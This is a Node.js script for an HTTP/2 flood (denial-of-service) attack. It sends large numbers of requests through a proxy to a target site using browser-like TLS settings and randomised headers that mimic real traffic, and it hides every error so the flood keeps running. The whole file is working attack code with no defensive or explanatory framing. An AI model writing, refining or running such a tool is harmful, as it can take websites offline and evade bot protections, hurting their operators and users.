const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');
const yargs = require('yargs');

const args = yargs.options({
	headers: {
		alias: 'h',
		describe: '"header@value"',
		array: true,
		demandOption: false
	}
}).argv;

function parseHeaders(headers) {
	const result = {};
	headers.forEach(header => {
		const [name, value] = header.split('@');
		if (name && value) result[name] = value;
	});
	return result;
}

const [target, time, ratelimit, proxy] = process.argv.slice(2);

if (!target || !time || !ratelimit || !proxy) {
	console.log('[Usage] node script.js <target> <time> <ratelimit> <proxy:port> -h "header@value"...');
	process.exit(1);
}

const parsed = url.parse(target);
const headersParsed = parseHeaders(args.headers || []);

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
	crypto.constants.SSL_OP_NO_SSLv3 |
	crypto.constants.SSL_OP_NO_TLSv1 |
	crypto.constants.SSL_OP_NO_TLSv1_1 |
	crypto.constants.ALPN_ENABLED |
	crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
	crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
	crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
	crypto.constants.SSL_OP_COOKIE_EXCHANGE |
	crypto.constants.SSL_OP_PKCS1_CHECK_1 |
	crypto.constants.SSL_OP_PKCS1_CHECK_2 |
	crypto.constants.SSL_OP_SINGLE_DH_USE |
	crypto.constants.SSL_OP_SINGLE_ECDH_USE |
	crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384`;
const sigalgss = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
const ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;

const secureContext = tls.createSecureContext({
	ciphers,
	sigalgs: sigalgss,
	honorCipherOrder: true,
	secureOptions,
	secureProtocol: 'TLS_client_method'
});

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

function jathreerandom() {
	const lang = ["en-US", "en-GB", "fr-FR", "de-DE", "ja-JP", "vi-VN"];
	const fetch = ['none', 'same-origin'];
	const options = ["document", "image", "script", "style"];
	const modes = ["cors", "no-cors", "same-origin"];

	const headers = {
		":method": "GET",
		":authority": parsed.host,
		":scheme": "https",
		":path": parsed.path + '?lang=' + lang[Math.floor(Math.random() * lang.length)],
		"sec-ch-ua": headersParsed['sec-ch-ua'] || "",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": `"Linux"`,
		"upgrade-insecure-requests": "1",
		"user-agent": headersParsed['user-agent'] || "Mozilla/5.0",
		"accept": headersParsed['accept'] || "*/*",
		"sec-fetch-site": fetch[Math.floor(Math.random() * fetch.length)],
		"sec-fetch-mode": modes[Math.floor(Math.random() * modes.length)],
		"sec-fetch-user": '?1',
		"sec-fetch-dest": options[Math.floor(Math.random() * options.length)],
		"accept-encoding": headersParsed['accept-encoding'] || "gzip, deflate, br",
		"accept-language": lang[Math.floor(Math.random() * lang.length)],
		"cookie": headersParsed['cookie'] || ""
	};
	return headers;
}

function flood() {
	const [proxyHost, proxyPort] = proxy.split(':');
	const agent = new http.Agent({
		keepAlive: false,
		maxSockets: Infinity
	});

	setInterval(() => {
		const request = http.request({
			method: 'CONNECT',
			host: proxyHost,
			port: proxyPort,
			path: parsed.hostname + ':443',
			agent: agent
		});

		request.on('connect', (res, socket) => {
			const client = http2.connect(target, {
				createConnection: () => tls.connect({
					socket: socket,
					host: parsed.hostname,
					servername: parsed.hostname,
					rejectUnauthorized: false,
					secureOptions,
					minVersion: 'TLSv1.2',
					ciphers,
					sigalgs: sigalgss,
					ecdhCurve,
					honorCipherOrder: false,
					requestCert: true,
					ALPNProtocols: ['h2', 'http/1.1'],
					secureContext
				}),
				settings: {
					enablePush: false,
					maxConcurrentStreams: 1000,
					initialWindowSize: 6291456
				}
			});

			client.on('error', () => {});
			for (let i = 0; i < ratelimit; i++) {
				const req = client.request(jathreerandom());
				req.setEncoding('utf8');
				req.on('response', (headers) => {
					if (['500', '502', '503', '522', '499'].includes(String(headers[":status"]))) {
						req.close();
					}
				});
				req.on('error', () => {});
				req.end();
			}
		});

		request.on('error', (e) => {
			console.log(`Proxy connection error: ${e.message}`);
		});

		request.end();
	}, 1000);
}

flood();

setTimeout(() => {
	console.clear();
	process.exit(0);
}, time * 1000);
